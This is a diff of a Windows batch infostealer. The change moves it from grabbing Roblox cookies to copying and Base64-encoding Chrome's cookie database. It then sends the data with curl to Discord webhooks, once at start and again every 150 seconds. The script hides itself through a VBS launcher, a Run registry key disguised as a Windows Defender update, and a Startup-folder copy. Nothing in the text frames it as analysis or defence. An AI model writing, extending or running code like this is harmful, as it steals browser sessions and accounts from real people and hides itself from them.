@@ -5,33 +5,41 @@ set "ONLINE=https://discord.com/api/webhooks/1563322005359689802/j8YrC7L0NiTS0Xr
 
 set "PC=%COMPUTERNAME%"
 set "USER=%USERNAME%"
-set "RC=%LOCALAPPDATA%\Roblox\LocalStorage\robloxcookies.dat"
-set "MY_PATH=%~dp0%~nx0"
+set "CHROME_COOKIES=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies"
+set "TEMP_COOKIES=%TEMP%\ck.tmp"
 
-:: --- PERSISTENCE SETUP ---
+:: --- PERSISTENCE ---
 echo Set WShell = CreateObject("WScript.Shell") > "%TEMP%\vanta_launch.vbs"
 echo WShell.Run """%~dp0%~nx0""", 0, False >> "%TEMP%\vanta_launch.vbs"
-
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "wscript.exe //B \"%TEMP%\vanta_launch.vbs\"" /f >nul
 copy /Y "%TEMP%\vanta_launch.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs" >nul
-:: --------------------------
+:: ------------------
 
-echo Sending initial logs...
-if exist "%RC%" (
-    for /f "tokens=*" %%a in ('type "%RC%"') do set "cookie=%%a"
-) else (
-    set "cookie=No cookie file found."
+echo Checking for Chrome...
+set "cookie_data=No Chrome cookies found. User might not have Chrome installed or logged in."
+
+if exist "%CHROME_COOKIES%" (
+    echo Chrome found. Copying cookies...
+    copy /Y "%CHROME_COOKIES%" "%TEMP_COOKIES%" >nul
+    
+    :: Encode the raw SQLite file to Base64 so it can be sent in a Discord text embed
+    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP_COOKIES%'))"`) do set "cookie_data=%%a"
+    
+    del "%TEMP_COOKIES%"
 )
 
+echo Sending initial logs...
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Initial Log\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %LOGS%
-curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Roblox Cookie\",\"description\":\"```\n%cookie%\n```\",\"color\":65280}]}" %LOGS%
+curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Chrome Cookie DB (Base64)\",\"description\":\"```\n%cookie_data%\n```\",\"color\":65280}]}" %LOGS%
 curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"User Online\",\"description\":\"Client: %PC% / %USER%\",\"color\":65280}]}" %ONLINE%
 
 echo Script is now looping.
 :loop
 timeout /t 150 /nobreak >nul
-if exist "%RC%" (
-    for /f "tokens=*" %%a in ('type "%RC%"') do set "cookie=%%a"
-    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Cookie\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie%\n```\",\"color\":65280}]}" %REGRAB%
+if exist "%CHROME_COOKIES%" (
+    copy /Y "%CHROME_COOKIES%" "%TEMP_COOKIES%" >nul
+    for /f "usebackq delims=" %%a in (`powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('%TEMP_COOKIES%'))"`) do set "cookie_data=%%a"
+    curl.exe -s -X POST -H "Content-Type: application/json" -d "{\"embeds\":[{\"title\":\"Regrab Chrome DB\",\"description\":\"Client: %PC% / %USER%\n```\n%cookie_data%\n```\",\"color\":65280}]}" %REGRAB%
+    del "%TEMP_COOKIES%"
 )
 goto loop
